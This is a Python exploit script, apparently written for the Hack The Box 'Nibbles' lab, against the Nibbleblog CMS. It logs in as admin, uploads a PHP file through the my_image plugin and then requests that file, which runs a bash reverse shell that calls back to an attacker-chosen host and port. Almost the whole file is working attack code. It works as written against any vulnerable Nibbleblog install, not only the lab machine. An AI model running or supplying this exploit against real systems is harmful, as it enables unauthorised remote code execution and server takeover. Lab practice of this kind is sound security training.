# Hackthebox nibbles file upload exploit
# Date Nov 13, 2022

import requests
import sys
import argparse

proxies = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

def login(s,url,username,password):
    login_url = url + "/admin.php"
    data = {"username":username,"password":password}
    r = s.post(login_url,data=data,proxies=proxies,verify=False)
    if "Incorrect username or password" in r.text:
        print("(-) Login Failed!. Username/Password Incorrect")
    else:
        print("(+)Login successfull")

def upload_shell(s,url,lhost,lport):
    payload = '<?php exec(\"/bin/bash -c \'bash -i >& /dev/tcp/' +lhost+ '/' +lport+ ' ' + '0>&1\'\");?>'
    upload_path = "/admin.php?controller=plugins&action=config&plugin=my_image"
    data = {'plugin':'my_image','title':'My image','position':'4','caption':'capton','image_resize':'1','image_width':'230','image_height':'200','image_option':'auto'}
    files = {'image': ('nibbles.php', payload, 'application/x-php')}
    r = s.post(url + upload_path,data=data,files=files,proxies=proxies,verify=False )
    if '<b>Warning</b>' in r.text:
        print('[+] Upload successfull.')
        print("(+) Executing shell,check for shell.")
    else:
        print('[-] Upload failed.')

def execute_shell(s, url):
	exploit_url = url + "/content/private/plugins/my_image/image.php"
	r = s.get(exploit_url)

	if r.status_code == 200:
		print('[+] Exploit launched, check for shell.')
	else:
		print('[!] Exploit failed.')

def main():
    parser = argparse.ArgumentParser()
    parser = argparse.ArgumentParser(epilog='\tExample: \r\npython3 ' + sys.argv[0] + " -x http://10.10.10.75/nibbleblog -u admin -p admin -l 10.10.14.8 -lp 8888")
    parser.add_argument('-x','--url',metavar='',help='URL of nibbleblog directory',required=True)
    parser.add_argument('-u','--username',metavar='', help='Username of nibbleblog admin panel',required=True)
    parser.add_argument('-p','--password',metavar='',help='Password of nibbleblog admin panel',required=True)
    parser.add_argument('-l','--lhost',metavar='',help='IP address of the listener attacker machine',required=True)
    parser.add_argument('-lp','--lport',metavar='',help='Listening port of attacker machine',required=True)
    args = parser.parse_args()
    url = args.url
    if (url.endswith("/")):
        url = url.rstrip("/")
    username = args.username
    password = args.password
    lhost = args.lhost
    lport = args.lport
    s = requests.Session()
    login(s,url,username,password)
    upload_shell(s, url,lhost,lport)
    execute_shell(s, url)

if __name__ == "__main__":
    main()
